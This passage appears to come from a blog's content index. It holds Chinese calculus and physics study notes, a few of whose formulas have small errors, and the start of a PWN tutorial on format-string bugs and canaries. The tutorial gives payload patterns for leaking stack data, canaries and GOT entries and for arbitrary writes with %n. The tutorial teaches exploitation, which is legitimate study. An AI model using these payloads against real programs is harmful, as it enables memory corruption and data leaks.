href="#数列极限与函数极限的关系" class="headerlink" title="数列极限与函数极限的关系"></a>数列极限与函数极限的关系</h2><h3 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h3><p>$$ 设f(x)在x_0某个去心领域\mathring{U}(x_0)内有定义，则\ \ \lim_{n \to \infty}f(x)&#x3D;A \Longleftrightarrow \forall {x_n}满足(1)\ \ x_n\in \mathring{U}(x_0);(2)\ \ \lim_{x\to\infty}x_n&#x3D;x_0,\ \ \lim_{n \to \infty}f(x_n)&#x3D;A $$</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>证明函数极限不存在</p><ol><li>找收敛于$x_0$的数列${x_n}$，但$f(x_n)$极限不存在</li><li>找两个收敛于的数列，但函数极限不同</li></ol><h2 id="夹逼准则"><a href="#夹逼准则" class="headerlink" title="夹逼准则"></a>夹逼准则</h2><h2 id="单调有界准则"><a href="#单调有界准则" class="headerlink" title="单调有界准则"></a>单调有界准则</h2><hr><h1 id="无穷"><a href="#无穷" class="headerlink" title="无穷"></a>无穷</h1><h2 id="无穷小"><a href="#无穷小" class="headerlink" title="无穷小"></a>无穷小</h2><p>$$ \forall\varepsilon&gt;0,\exist \delta&gt;0,s.t.|f(x)|&lt;\varepsilon ,when \ \ 0&lt;|x-x_0|&lt;\delta $$</p><h2 id="无穷大"><a href="#无穷大" class="headerlink" title="无穷大"></a>无穷大</h2><p>$$ \forall M&gt;0,\exist \delta&gt;0,s.t.|f(x)|&gt;M,when \ \ 0&lt;|x-x_0|&lt;\delta $$</p><h2 id="定理-1"><a href="#定理-1" class="headerlink" title="定理"></a>定理</h2><p>无穷小与有界变量之积为无穷小</p><h2 id="重要极限"><a href="#重要极限" class="headerlink" title="重要极限"></a>重要极限</h2><p>$$ \lim_{x\to\infty}(1+\frac{1}{x})^x&#x3D;e $$</p><h2 id="等价无穷小"><a href="#等价无穷小" class="headerlink" title="等价无穷小"></a>等价无穷小</h2><hr><h1 id="一元函数积分学"><a href="#一元函数积分学" class="headerlink" title="一元函数积分学"></a>一元函数积分学</h1><h2 id="函数可积的充分条件"><a href="#函数可积的充分条件" class="headerlink" title="函数可积的充分条件"></a>函数可积的充分条件</h2><p>$$ f(x)在[a,b]上连续 \Longrightarrow f(x)在[a,b]上可积\Longleftarrow f(x)在[a,b]上有界，且只有有限个第一类间断点 $$</p><h2 id="定理-2"><a href="#定理-2" class="headerlink" title="定理"></a>定理</h2><h3 id="估值定理"><a href="#估值定理" class="headerlink" title="估值定理"></a>估值定理</h3><p>$$ M,m是f(x)区间[a,b]上最大值和最小值，则 $$</p><p>$$ m(b-a)\leq \int^b_af(x)dx\leq M(b-a),(a&lt;b) $$</p><h3 id="积分中值定理"><a href="#积分中值定理" class="headerlink" title="积分中值定理"></a>积分中值定理</h3><p>$$ 设f(x)\in C[a,b],则至少存在一点\xi \in(a,b)，使得 $$</p><p>$$ \int^b_af(x)dx&#x3D;f(\xi)(b-a) $$</p><h2 id="积分上限函数"><a href="#积分上限函数" class="headerlink" title="积分上限函数"></a>积分上限函数</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>$$ \Phi(x)&#x3D;\int^x_af(t)dt\ \ \ \ (a\leq x\leq b) $$</p><h3 id="定理-3"><a href="#定理-3" class="headerlink" title="定理"></a>定理</h3><p>$$ f(x)\in C[a,b],则\Phi’(x)&#x3D;f(x) $$</p><p>$$ f(x)\in C[a,b]，则f(x)在[a,b]上必有原函数 $$</p><h2 id="微积分基本定理"><a href="#微积分基本定理" class="headerlink" title="微积分基本定理"></a>微积分基本定理</h2><h2 id="不定积分"><a href="#不定积分" class="headerlink" title="不定积分"></a>不定积分</h2><h2 id="反常积分"><a href="#反常积分" class="headerlink" title="反常积分"></a>反常积分</h2><h3 id="无穷区间"><a href="#无穷区间" class="headerlink" title="无穷区间"></a>无穷区间</h3><h3 id="无界"><a href="#无界" class="headerlink" title="无界"></a>无界</h3><h2 id="几何应用"><a href="#几何应用" class="headerlink" title="几何应用"></a>几何应用</h2><h3 id="极坐标下求面积"><a href="#极坐标下求面积" class="headerlink" title="极坐标下求面积"></a>极坐标下求面积</h3><p>扇形面积微元：</p><p>$$ dA&#x3D;\frac{1}{2}r^2(\theta)d\theta $$</p><hr><h1 id="一元函数微分学"><a href="#一元函数微分学" class="headerlink" title="一元函数微分学"></a>一元函数微分学</h1><h2 id="导数"><a href="#导数" class="headerlink" title="导数"></a>导数</h2><p>$$ 函数在某点可导\implies 函数在某点连续 $$</p><p>$$ 函数在某点可导\nLeftarrow 函数在某点连续 $$</p><h3 id="反函数求导"><a href="#反函数求导" class="headerlink" title="反函数求导"></a>反函数求导</h3><p>$$ (f^{-1})’(x)&#x3D;\frac{1}{f’(y)} $$</p><h3 id="参数式函数、反函数二阶求导"><a href="#参数式函数、反函数二阶求导" class="headerlink" title="参数式函数、反函数二阶求导"></a>参数式函数、反函数二阶求导</h3><h2 id="隐函数求导"><a href="#隐函数求导" class="headerlink" title="隐函数求导"></a>隐函数求导</h2><h3 id="对数求导法"><a href="#对数求导法" class="headerlink" title="对数求导法"></a>对数求导法</h3><h2 id="参数式函数求导"><a href="#参数式函数求导" class="headerlink" title="参数式函数求导"></a>参数式函数求导</h2><h2 id="高阶导数"><a href="#高阶导数" class="headerlink" title="高阶导数"></a>高阶导数</h2><p>$$ (sinx)^{(n)}&#x3D;sin(x+\frac{\pi}{2}n) $$</p><p>$$ (cosx)^{(n)}&#x3D;cos(x+\frac{\pi}{2}n) $$</p><p>$$ [\alpha u(x)+\beta v(x)]^{(n)}&#x3D;\alpha u^{(n) }(x)+\beta v^{(n)}(x) $$</p><p>莱布尼兹公式：</p><p>$$ (uv)^{(n)}&#x3D;\sum^{n}_{k&#x3D;0}C^k_nu^{(n-k)}v^{(k)} $$</p><h2 id="微分"><a href="#微分" class="headerlink" title="微分"></a>微分</h2><p>$$ \Delta y&#x3D;A\Delta x+o(\Delta x) $$</p><p>$$ 可导\iff 可微 $$</p><p>$$ \frac{dy}{dx}&#x3D;f’(x) $$</p><h3 id="线性近似"><a href="#线性近似" class="headerlink" title="线性近似"></a>线性近似</h3><p>$$ f(x) \approx f(x_0)+f’(x_0)(x-x_0) $$</p><h2 id="微分中值定理"><a href="#微分中值定理" class="headerlink" title="微分中值定理"></a>微分中值定理</h2><h3 id="罗尔中值定理"><a href="#罗尔中值定理" class="headerlink" title="罗尔中值定理"></a>罗尔中值定理</h3><h3 id="拉格朗日中值定理"><a href="#拉格朗日中值定理" class="headerlink" title="拉格朗日中值定理"></a>拉格朗日中值定理</h3><h3 id="柯西中值定理"><a href="#柯西中值定理" class="headerlink" title="柯西中值定理"></a>柯西中值定理</h3><h2 id="泰勒公式"><a href="#泰勒公式" class="headerlink" title="泰勒公式"></a>泰勒公式</h2><h2 id="曲率"><a href="#曲率" class="headerlink" title="曲率"></a>曲率</h2><h3 id="弧微分公式"><a href="#弧微分公式" class="headerlink" title="弧微分公式"></a>弧微分公式</h3><p>$$ ds&#x3D;\sqrt{1+y’^{2}}dx $$</p><h2 id="曲率-1"><a href="#曲率-1" class="headerlink" title="曲率"></a>曲率</h2><p>$$ K&#x3D;\lim_{\Delta s\to 0}|\frac{\Delta \alpha }{\Delta s}|&#x3D;|\frac{d\alpha }{ds}| $$</p><h3 id="曲率计算公式"><a href="#曲率计算公式" class="headerlink" title="曲率计算公式"></a>曲率计算公式</h3><p>懒得写了</p><hr><h1 id="一元函数积分学-1"><a href="#一元函数积分学-1" class="headerlink" title="一元函数积分学"></a>一元函数积分学</h1><h2 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h2><p>$$<br> \int \sec^2x\mathrm{d}x&#x3D;\tan x+C \\<br> \int \csc^2x\mathrm{d}x&#x3D;-\cot x+C \\<br> \int \sec x\tan x \mathrm{d}x &#x3D;\sec x+C \\<br> \int \csc x\cot x\mathrm{d}x&#x3D;-\csc x+C \\<br> \int \frac{1}{\sqrt{1-x^2}}\mathrm{d}x&#x3D;\arcsin x+C \\<br> \int \frac{1}{1+x^2}\mathrm{d}x&#x3D;\arctan x+C \\<br>$$</p><p>$$<br>\int \tan x\mathrm{d}x&#x3D;-\ln\lvert \cos x\rvert +C\\<br> \int \cot x\mathrm{d}x&#x3D;\ln\lvert\sin x\rvert +C\\<br> \int \sec x\mathrm{d}x&#x3D;\ln \lvert \sec x+\tan x\rvert +C\\<br> \int \csc x\mathrm{d}x&#x3D;\ln\lvert \csc x- \cot x\rvert +C\\<br> \int \frac{1}{a^2-x^2}\mathrm{d}x&#x3D;\frac{1}{2a}\ln\lvert\frac{a+x}{a-x}\rvert +C\\<br> \int \frac{1}{\sqrt{x^2\pm a^2}}\mathrm{d}x&#x3D;\ln\lvert x+ \sqrt{x^2\pm a^2}\rvert +C\\\\<br>$$</p><p>$$<br>\int ^{\frac{\pi}{2}}_0f(\sin x)\mathrm{d}x&#x3D;\int ^{\frac{\pi}{2}}_0f(\cos x)\mathrm{d}x\\<br> \int ^{\pi}_0xf(\sin x)\mathrm{d}x&#x3D;\frac{\pi}{2}\int ^{\pi}_0f(\sin x)\mathrm{d}x\\<br> \int ^{\pi}_0f(\sin x)\mathrm{d}x&#x3D;2\int ^{\frac{\pi}{2}}_0f(\sin x)\mathrm{d}x<br>$$</p><h1 id="常微分方程"><a href="#常微分方程" class="headerlink" title="常微分方程"></a>常微分方程</h1><p>常微分方程：未知函数一元</p><p>偏微分方程：未知函数二元及以上</p><h2 id="一阶微分方程-First-Order-Differential-Equations"><a href="#一阶微分方程-First-Order-Differential-Equations" class="headerlink" title="一阶微分方程(First-Order Differential Equations)"></a>一阶微分方程(First-Order Differential Equations)</h2><h3 id="齐次方程"><a href="#齐次方程" class="headerlink" title="齐次方程"></a>齐次方程</h3><p>$$<br> \frac{dy}{dx}&#x3D;\varphi (\frac{y}{x})<br>$$</p><p>$$ 令u&#x3D;\frac{y}{x},\space u+x\frac{du}{dx}&#x3D;\varphi(u) $$</p><h3 id="一阶线性方程"><a href="#一阶线性方程" class="headerlink" title="一阶线性方程"></a>一阶线性方程</h3><p>$$<br>\frac{dy}{dx}+P(x)y&#x3D;Q(x)\\<br> y&#x3D;\frac{1}{v(x)} \int v(x)Q(x)dx,\space v&#x3D;e^{\int P(x)dx}<br>$$</p><h3 id="伯努利-Bernoulli-方程"><a href="#伯努利-Bernoulli-方程" class="headerlink" title="伯努利(Bernoulli)方程"></a>伯努利(Bernoulli)方程</h3><p>$$<br>\frac{dy}{dx}+P(x)y&#x3D;Q(x)y^n ,\space(n \neq 0,1)\\<br> y^{-n}\frac{dy}{dx}+P(x)y^{1-n}&#x3D;Q(x)<br>$$</p><p>$$ 令z&#x3D;y^{1-n},\space \frac {dz}{dx}&#x3D;(1-n)y^{-n} \frac{dy}{dx} $$</p><p>$$ 将y代回原方程,\space \frac{dz}{dx}+(1-n)P(x)z&#x3D;(1-n)Q(x) $$</p><h2 id="可降价的高阶微分方程"><a href="#可降价的高阶微分方程" class="headerlink" title="可降价的高阶微分方程"></a>可降价的高阶微分方程</h2><ol><li><p>$y^{(n)}&#x3D;f(x)$</p></li><li><p>$y’’&#x3D;f(x,y’)$</p></li><li><p>$y’’&#x3D;f(y,y’)$</p><p>令$p&#x3D;y’$</p></li></ol><h2 id="二阶齐次线性方程"><a href="#二阶齐次线性方程" class="headerlink" title="二阶齐次线性方程"></a>二阶齐次线性方程</h2><p>$$<br>\frac{d^2y}{dx^2}+P(x)\frac{dy}{dx}+Q(x)y&#x3D;0<br>$$</p><h3 id="线性微分算子"><a href="#线性微分算子" class="headerlink" title="线性微分算子"></a>线性微分算子</h3><p>$$<br>L(C_1 y_1+C_2y_2)&#x3D;C_1L(y_1)+C_2L(y_2)<br>$$</p><p>定理1：二阶齐次线性方程的两个解的线性组合仍是该方程的解</p><p>定理2：设$y_1(x),y_2(x)$均不为零，则线性相关$\Leftrightarrow $两函数之比恒等于一个常熟，反之不恒等</p><p>定理3： 两个线性无关特解的线性组合为通解</p><h3 id="二阶常系数齐次线性方程"><a href="#二阶常系数齐次线性方程" class="headerlink" title="二阶常系数齐次线性方程"></a>二阶常系数齐次线性方程</h3><p>$$<br> y’’+py’+qy&#x3D;0<br>$$</p><p>$$ 欧拉待定指数函数法：设方程有解y&#x3D;e^{rx},代入得:r^2+pr+q&#x3D;0（特征方程） $$</p><ol><li>$\Delta&gt;0$</li><li>$\Delta&#x3D;0$</li></ol><p>$$ 需找出另一解，设\frac{y_2}{y_1}&#x3D;u(x)不为常数 $$</p><p>$$ y_2&#x3D;e^{r_1x}u(x)，求导两次 $$</p><p>$$ 代入微分方程，整理,一通操作：y_2&#x3D;xe^{r_1x} $$</p><ol><li>$\Delta&lt;0$</li></ol><p>$$<br>r&#x3D;\alpha \pm i\beta\\<br> y&#x3D;e^{\alpha x}(C_1\cos\beta x+C_2\sin \beta x)<br>$$</p><h3 id="二阶非齐次线性方程"><a href="#二阶非齐次线性方程" class="headerlink" title="二阶非齐次线性方程"></a>二阶非齐次线性方程</h3><h1 id="多元函数积分学"><a href="#多元函数积分学" class="headerlink" title="多元函数积分学"></a>多元函数积分学</h1><h2 id="数量值函数"><a href="#数量值函数" class="headerlink" title="数量值函数"></a>数量值函数</h2><h3 id="二重"><a href="#二重" class="headerlink" title="二重"></a>二重</h3><h3 id="三重"><a href="#三重" class="headerlink" title="三重"></a>三重</h3><h3 id="第一类曲线"><a href="#第一类曲线" class="headerlink" title="第一类曲线"></a>第一类曲线</h3><h3 id="第一类曲面"><a href="#第一类曲面" class="headerlink" title="第一类曲面"></a>第一类曲面</h3><h3 id="质心"><a href="#质心" class="headerlink" title="质心"></a>质心</h3><h2 id="向量值函数"><a href="#向量值函数" class="headerlink" title="向量值函数"></a>向量值函数</h2><h3 id="第二类曲线"><a href="#第二类曲线" class="headerlink" title="第二类曲线"></a>第二类曲线</h3><h3 id="第二类曲面"><a href="#第二类曲面" class="headerlink" title="第二类曲面"></a>第二类曲面</h3><h3 id="公式-1"><a href="#公式-1" class="headerlink" title="公式"></a>公式</h3><h4 id="格林公式"><a href="#格林公式" class="headerlink" title="格林公式"></a>格林公式</h4><p><strong>第二类曲线积分</strong>与<strong>二重积分</strong><br>$$<br>\iint\limits_D\bigg(\frac{\part{Q}}{\part{x}}-\frac{\part{P}}{\part{y}}\bigg)dxdy&#x3D;\oint_LPdx+Qdy<br>$$</p><p>$$<br>\iint\limits_D\bigg(\frac{\part{Q}}{\part{x}}-\frac{\part{P}}{\part{y}}\bigg)dxdy&#x3D;\oint_{L_1}Pdx+Qdy+\oint_{L_2}Pdx+Qdy<br>$$</p><h4 id="高斯公式"><a href="#高斯公式" class="headerlink" title="高斯公式"></a>高斯公式</h4><p><strong>第二类曲面积分</strong>与<strong>三重积分</strong><br>$$<br>\iiint\limits_V\bigg(\frac{\part{P}}{\part{x}}+\frac{\part{Q}}{\part{y}}+\frac{\part{R}}{\part{z}}\bigg)dV&#x3D;\oiint\limits_SPdydz+Qdzdx+Rdxdy<br>$$</p><h4 id="斯托克斯公式"><a href="#斯托克斯公式" class="headerlink" title="斯托克斯公式"></a>斯托克斯公式</h4><p><strong>空间第二类曲线积分</strong>与<strong>第二类曲面积分</strong><br>$$<br>\oint\limits_LPdx+Qdy+Rdz&#x3D;\iint\limits_S\left |\begin{array}{cccc}<br>dydz &amp;dzdx  &amp;dxdy \<br>\frac{\part}{\part{x}} &amp;\frac{\part}{\part{y}}&amp;\frac{\part}{\part{z}}  \<br>P &amp; Q &amp;R \<br>\end{array}\right|<br>$$</p><h3 id="路径无关"><a href="#路径无关" class="headerlink" title="路径无关"></a>路径无关</h3><h1 id="无穷级数"><a href="#无穷级数" class="headerlink" title="无穷级数"></a>无穷级数</h1><h2 id="常用级数"><a href="#常用级数" class="headerlink" title="常用级数"></a>常用级数</h2><p>几何级数：<br>$$<br>\sum_{n&#x3D;0}^{\infty}aq^n&#x3D;\left{<br>\begin{aligned}<br>\frac{a}{1-q} &amp; , &amp; |q|&lt;1, \<br>发散 &amp; , &amp; |q|&gt;1<br>\end{aligned}<br>\right.<br>$$<br>调和级数</p><p>P级数<br>$$<br>\sum_{n&#x3D;1}^{\infty}(-1)^n\frac{1}{n^p}&#x3D;\left{<br>\begin{aligned}<br>发散 &amp; , &amp; p\leq 0, \<br>条件收敛 &amp; , &amp; 0&lt;p\leq 1, \<br>绝对收敛 &amp; , &amp; p&gt;1<br>\end{aligned}<br>\right.<br>$$</p><h2 id="常数项级数判别"><a href="#常数项级数判别" class="headerlink" title="常数项级数判别"></a>常数项级数判别</h2><h3 id="正数项"><a href="#正数项" class="headerlink" title="正数项"></a>正数项</h3><h4 id="比较判敛法"><a href="#比较判敛法" class="headerlink" title="比较判敛法"></a>比较判敛法</h4><p>n&gt;N,k</p><p>比值为正数</p><h4 id="比值判敛法"><a href="#比值判敛法" class="headerlink" title="比值判敛法"></a>比值判敛法</h4><p>达朗贝尔</p><h4 id="根值判敛法"><a href="#根值判敛法" class="headerlink" title="根值判敛法"></a>根值判敛法</h4><p>柯西</p><h3 id="交错项"><a href="#交错项" class="headerlink" title="交错项"></a>交错项</h3><h4 id="莱布尼兹"><a href="#莱布尼兹" class="headerlink" title="莱布尼兹"></a>莱布尼兹</h4>]]></content>
      
      
      <categories>
          
          <category> 数理笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> caculus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MK_Physics</title>
      <link href="/MK-Physics/"/>
      <url>/MK-Physics/</url>
      
        <content type="html"><![CDATA[<h1 id="振动-波"><a href="#振动-波" class="headerlink" title="振动&amp;波"></a>振动&amp;波</h1><h2 id="简谐振动"><a href="#简谐振动" class="headerlink" title="简谐振动"></a>简谐振动</h2><h3 id="简谐振动的速度、加速度"><a href="#简谐振动的速度、加速度" class="headerlink" title="简谐振动的速度、加速度"></a>简谐振动的速度、加速度</h3><p>$$<br>x&#x3D;Acos(\omega t+\varphi)\\<br> v&#x3D;-\omega A sin(\omega t+\varphi)\\<br> a&#x3D;-\omega ^2 A cos(\omega t+\varphi)\\<br> 运动学特性:a&#x3D;-\omega ^2 x\\<br> 动力学特性:F&#x3D;ma&#x3D;-m\omega ^2x&#x3D;-kx\\<br> 等效劲度系数:k&#x3D;m\omega^2<br>$$</p><h3 id="简谐振动的能量"><a href="#简谐振动的能量" class="headerlink" title="简谐振动的能量"></a>简谐振动的能量</h3><h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><p>$$<br>(瞬时)振动势能:E_p&#x3D;\frac{1}{2}kx^2&#x3D;\frac{1}{2}kA^2cos^2(\omega t+\varphi)\\<br> (瞬时)振动动能:E_k&#x3D;\frac{1}{2}mv^2&#x3D;\frac{1}{2}m\omega^2 A^2 sin^2(\omega t+\varphi)\\<br> E&#x3D;E_p+E_k&#x3D;\frac{1}{2}kA^2\\<br> 平均能量:\overline{E}_p&#x3D;\overline{E}_k&#x3D;\frac{1}{4}kA^2<br>$$</p><p>p.s.振动势能和弹性势能一般<strong>不相同</strong></p><h4 id="证明简谐运动"><a href="#证明简谐运动" class="headerlink" title="证明简谐运动"></a>证明简谐运动</h4><p>由于对下式求导：<br>$$<br>E&#x3D;E_p+E_k&#x3D;C<br>$$<br>可得：<br>$$<br>w^2&#x3D;\frac{k}{m}<br>$$</p><p>故可先写出振动体系能量关系，若能量守恒，就可求导得出谐振子动力学方程，多用于非机械振动</p><h3 id="简谐振动的运动学描述"><a href="#简谐振动的运动学描述" class="headerlink" title="简谐振动的运动学描述"></a>简谐振动的运动学描述</h3><h4 id="解析法"><a href="#解析法" class="headerlink" title="解析法"></a>解析法</h4><p>$$<br>w&#x3D;\sqrt{\frac{k}{m}}\<br> A&#x3D;\sqrt{x^2+\frac{v^2}{w^2}}\<br> tg\varphi&#x3D;-\frac{v_0}{wx_0}<br>$$</p><h4 id="旋转矢量法"><a href="#旋转矢量法" class="headerlink" title="旋转矢量法"></a>旋转矢量法</h4><h4 id="曲线法"><a href="#曲线法" class="headerlink" title="曲线法"></a>曲线法</h4><h3 id="简谐振动的合成"><a href="#简谐振动的合成" class="headerlink" title="简谐振动的合成"></a>简谐振动的合成</h3><h4 id="同频率平行"><a href="#同频率平行" class="headerlink" title="同频率平行"></a>同频率平行</h4><p>$$<br>x_1&#x3D;A_1cos(\omega t+\varphi_1)\\<br> x_2&#x3D;A_2cos(\omega t+\varphi_2)\\<br> x&#x3D;x_1+x_2&#x3D;x_1&#x3D;Acos(\omega t+\varphi)\<br>$$</p><p>由<strong>旋转矢量法</strong>求得：</p><p>$$<br>A&#x3D; \sqrt{A_1^2+A_2^2+2A_1A_2\cos(\varphi_2-\varphi_1)}\\<br> tg\varphi&#x3D;\frac{A_1\sin\varphi_1+A_2\sin \varphi_2}{A_1\cos\varphi_1+A_2\cos\varphi_2}\<br>$$</p><h4 id="不同频率平行"><a href="#不同频率平行" class="headerlink" title="不同频率平行"></a>不同频率平行</h4><p>$$<br>x_1&#x3D;A\cos(\omega_1 t+\varphi)\\<br> x_2&#x3D;A\cos(\omega_2 t+\varphi)\\<br> x&#x3D;x_1+x_2&#x3D;2A\cos\frac{\omega_2-\omega_1}{2}t\cos(\frac{\omega_1+\omega_2}{2}t+\varphi)<br>$$</p><p>当$$ \omega_1 $$和$$ \omega_2 $$都较大且相差很小时，$$ \cos\frac{\omega_2-\omega_1}{2}t $$ 的周期比$$ cos(\frac{\omega_1+\omega_2}{2}t+\varphi) $$ 长得多，前者频率为<strong>调制频率</strong>，后者频率为<strong>载频</strong></p><h4 id="垂直"><a href="#垂直" class="headerlink" title="垂直"></a>垂直</h4><h5 id="同频率"><a href="#同频率" class="headerlink" title="同频率"></a>同频率</h5><p>$$<br>x&#x3D;A_1\cos(\omega t+\varphi_1)\\<br> y&#x3D;A_2\cos(\omega t+\varphi_2)\\<br> \frac{x^2}{A_1^2}+\frac{y^2}{A_2^2}-2\frac{x}{A_1}\frac{y}{A_2}\cos(\varphi_2-\varphi_1)&#x3D;\sin^2(\varphi_2-\varphi_1)<br>$$</p><ol><li>一般为椭圆，形状由$$ \Delta \varphi $$决定</li><li>$$ \Delta \varphi&#x3D;2k\pi $$时，为直线，合振动<strong>为简谐振动</strong></li><li>$$ \Delta \varphi&#x3D;\pm\frac{\pi}{2} $$时，为椭圆，合振动<strong>不为简谐振动</strong>，正为顺时针</li></ol><h5 id="不同频率"><a href="#不同频率" class="headerlink" title="不同频率"></a>不同频率</h5><p>若频率有简单倍数关系，形成<strong>李萨如图形</strong></p><h2 id="波"><a href="#波" class="headerlink" title="波"></a>波</h2><h3 id="描述量"><a href="#描述量" class="headerlink" title="描述量"></a>描述量</h3><p><strong>波速</strong>（相速）：<br>$$<br>u&#x3D;\sqrt{\frac{B}{\rho}},\ \ B为弹性模量\ \rho为质量密度（惯性）<br>$$<br>机械波波速取决于<strong>介质本身的性质</strong>，与波源振动的频率无关</p><h3 id="波动方程"><a href="#波动方程" class="headerlink" title="波动方程"></a>波动方程</h3><p>$$<br>y&#x3D;A\cos[\omega(t\mp \frac{x}{u})+\varphi_0]<br>$$</p><h3 id="动力学方程"><a href="#动力学方程" class="headerlink" title="动力学方程"></a>动力学方程</h3><p>将运动学方程中$y$对$t$，$x$求二阶偏导<br>$$<br>\frac{\partial^2{y}}{\partial{x}^2}&#x3D;\frac{1}{u}\frac{\partial^2y}{\partial{t}^2}<br>$$</p><h3 id="波的能流和强度"><a href="#波的能流和强度" class="headerlink" title="波的能流和强度"></a>波的能流和强度</h3><h4 id="波的能量"><a href="#波的能量" class="headerlink" title="波的能量"></a>波的能量</h4><p>$$<br>质元动能:\mathrm{d}E_k&#x3D;\frac{1}{2}(\rho\mathrm{d}V)\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]\\<br> 质元弹性势能:\mathrm{d}E_p&#x3D;\frac{1}{2}(\rho\mathrm{d}V)\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]\\<br> 质元能量:\mathrm{d}E&#x3D;(\rho\mathrm{d}V)\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]\\<br> 能量密度:w(x)&#x3D;\frac{\mathrm{d}E}{\mathrm{d}V}&#x3D;\rho\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]\\<br> 平均能量密度:\overline{w}(x)&#x3D;\frac{1}{T}\int ^T _0\rho\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]\mathrm{d}t&#x3D;\frac{1}{2}\rho\omega^2A^2<br>$$<br>质元的机械能不是常量，随时间周期性变化，但能量密度在一个周期内平均值是常量</p><h4 id="波的能流和能流密度"><a href="#波的能流和能流密度" class="headerlink" title="波的能流和能流密度"></a>波的能流和能流密度</h4><p>$$<br>能流:P&#x3D;wuS&#x3D;\frac{\mathrm{d}E}{\mathrm{d}V}&#x3D;\rho\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]uS\\<br> 平均能流:\overline{P}&#x3D;\overline{w}uS&#x3D;\frac{1}{2}\rho\omega^2A^2uS\\<br> 平均能流密度(波强):I&#x3D;\frac{\overline{P}}{S}&#x3D;\frac{1}{2}\rho\omega^2A^2u<br>$$</p><h3 id="波的叠加和干涉"><a href="#波的叠加和干涉" class="headerlink" title="波的叠加和干涉"></a>波的叠加和干涉</h3><p>$$<br>\Delta\varphi&#x3D;\varphi_2-\varphi_1-\frac{2\pi}{\lambda}(r_2-r_1)<br>$$<br>为$ 2k\pi $时加强，$ (2k+1)\pi $时减弱</p><h3 id="驻波"><a href="#驻波" class="headerlink" title="驻波"></a>驻波</h3><h4 id="半波损失"><a href="#半波损失" class="headerlink" title="半波损失"></a>半波损失</h4>]]></content>
      
      
      <categories>
          
          <category> 数理笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Physics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN从入门到出入平安（一）——格式化字符与Canary</title>
      <link href="/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%8ECanary/"/>
      <url>/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%8ECanary/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写的很乱，日后再改</p></blockquote><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="格式化输出函数"><a href="#格式化输出函数" class="headerlink" title="格式化输出函数"></a>格式化输出函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fprintf</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure><h4 id="占位符语法"><a href="#占位符语法" class="headerlink" title="占位符语法"></a>占位符语法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure><h6 id="parameter"><a href="#parameter" class="headerlink" title="parameter"></a>parameter</h6><p>n$：第几个参数</p><h6 id="type"><a href="#type" class="headerlink" title="type"></a>type</h6><p>X：Hex</p><p>p：void*指针型值</p><p>n：把已经成功输出的字符个数写入对应整型指针参数所指变量</p><p>%n     一次性写入 4 个字节</p><p>%hn     一次性写入 2 个字节</p><p>%hhn    一次性写入 1 个字节</p><p>%lln 8</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>第几个参数可以通过gdb的fmtarg功能查找</p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%8ECanary.assets/image-20230522230246834.png" alt="image-20230522230246834"></p><blockquote><p>懒狗是这样的，直接截</p></blockquote><h4 id="泄露栈上数据"><a href="#泄露栈上数据" class="headerlink" title="泄露栈上数据"></a>泄露栈上数据</h4><p><code>%X$p</code> <code>%X$x</code> <code>%08x</code> 可泄露栈上数据，可用于泄露canary</p><p>也可先在栈上写上需要的数据，再利用进行任意内存写，如<code>%Yc%X$n</code> </p><h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><p>libcmain地址会在调用main时存入</p><h4 id="泄露栈上地址指向的数据"><a href="#泄露栈上地址指向的数据" class="headerlink" title="泄露栈上地址指向的数据"></a>泄露栈上地址指向的数据</h4><p><code> %s</code> 显示地址指向的ascll，可用于got表泄露</p><h4 id="覆盖栈上任意地址"><a 